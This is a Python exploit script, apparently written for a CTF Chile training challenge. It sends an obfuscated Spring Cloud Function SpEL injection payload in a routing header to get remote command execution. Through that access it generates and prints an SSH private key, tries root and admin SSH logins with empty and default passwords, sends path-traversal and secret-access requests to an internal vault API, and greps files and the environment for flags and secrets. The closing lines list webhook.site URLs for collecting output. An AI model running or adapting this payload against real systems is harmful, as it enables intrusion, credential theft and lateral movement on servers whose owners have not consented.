#!/usr/bin/env python3
"""
CTF Chile - Acceso de emergencia directo
Método más agresivo para conseguir acceso inmediato
"""
import requests
import time
import sys

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🚨 ACCESO DE EMERGENCIA - MÉTODO DIRECTO")
print("=" * 50)

def execute_rce(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        return r.text
    except Exception as e:
        return f"Error: {e}"

print("[1/4] Generando clave SSH y estableciendo acceso...")

# Generar clave SSH
print("    • Generando clave SSH...")
result1 = execute_rce("ssh-keygen -t rsa -f /tmp/emergency_key -N '' -q")

# Leer la clave privada
print("    • Leyendo clave privada...")
result2 = execute_rce("cat /tmp/emergency_key")
print("CLAVE PRIVADA:")
print(result2)

# Leer la clave pública
print("    • Leyendo clave pública...")
result3 = execute_rce("cat /tmp/emergency_key.pub")
print("CLAVE PÚBLICA:")
print(result3)

print("\n[2/4] Intentando establecer acceso SSH directo...")

# Intentos directos de acceso SSH
ssh_attempts = [
    "ssh -i /tmp/emergency_key -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'echo ACCESS_SUCCESS_ROOT'",
    "ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o PasswordAuthentication=no root@10.160.209.1 'echo ACCESS_NO_AUTH_ROOT'",
    "sshpass -p '' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'echo ACCESS_EMPTY_PASSWORD'",
    "sshpass -p 'admin' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no admin@10.160.209.1 'echo ACCESS_ADMIN_ADMIN'",
]

for attempt in ssh_attempts:
    print(f"    • Probando: {attempt[:50]}...")
    result = execute_rce(attempt)
    if "ACCESS_" in result:
        print(f"    ✅ ÉXITO: {result}")
    else:
        print(f"    ❌ Fallo: {result[:100]}...")

print("\n[3/4] Explorando vulnerabilidades específicas de OmniVault...")

# Intentar exploits específicos en OmniVault
omnivault_exploits = [
    "curl -s http://10.160.209.1:8080/api/../../../etc/passwd",
    "curl -s http://10.160.209.1:8080/api/admin/config?debug=true",
    "curl -s -X POST http://10.160.209.1:8080/api/vault -d '{\"command\":\"ls -la /\"}' -H 'Content-Type: application/json'",
    "curl -s http://10.160.209.1:8080/api/secrets?token=admin&format=json",
]

for exploit in omnivault_exploits:
    print(f"    • {exploit}")
    result = execute_rce(exploit)
    if len(result) > 50 and not "Connection refused" in result:
        print(f"    ✅ Respuesta: {result[:200]}...")
    else:
        print(f"    ❌ Sin respuesta útil")

print("\n[4/4] Búsqueda directa de flags en ubicaciones críticas...")

# Búsquedas específicas de flags
flag_searches = [
    "find / -name '*flag*' 2>/dev/null | head -20",
    "grep -r 'CTF{' /app/ /root/ /home/ /etc/ 2>/dev/null | head -10",
    "env | grep -iE '(flag|ctf|secret)'",
    "cat /etc/passwd | grep -E '(flag|ctf)'",
    "strings /app/app.jar | grep -E 'CTF{|FLAG{'",
    "find /tmp /var/tmp -name '*flag*' -o -name '*ctf*' 2>/dev/null | xargs cat",
]

for search in flag_searches:
    print(f"    • {search}")
    result = execute_rce(search)
    if result and len(result.strip()) > 0:
        print(f"    ✅ RESULTADO: {result}")
        if "CTF{" in result or "FLAG{" in result:
            print(f"\n🏆 FLAG ENCONTRADA: {result}")
    else:
        print("    ❌ Sin resultados")

print("\n" + "="*60)
print("🚨 ANÁLISIS DE EMERGENCIA COMPLETADO")
print("Si aparece alguna FLAG arriba, ¡ya la tienes!")
print("Si no, necesitamos revisar los webhooks manualmente:")
print("• https://webhook.site/#!/d23e1113-6d61-4f18-abd0-1e7e98948c8d")
print("• https://webhook.site/#!/4b46c013-f5ae-491f-b999-e83989fc4aa9")
print("="*60)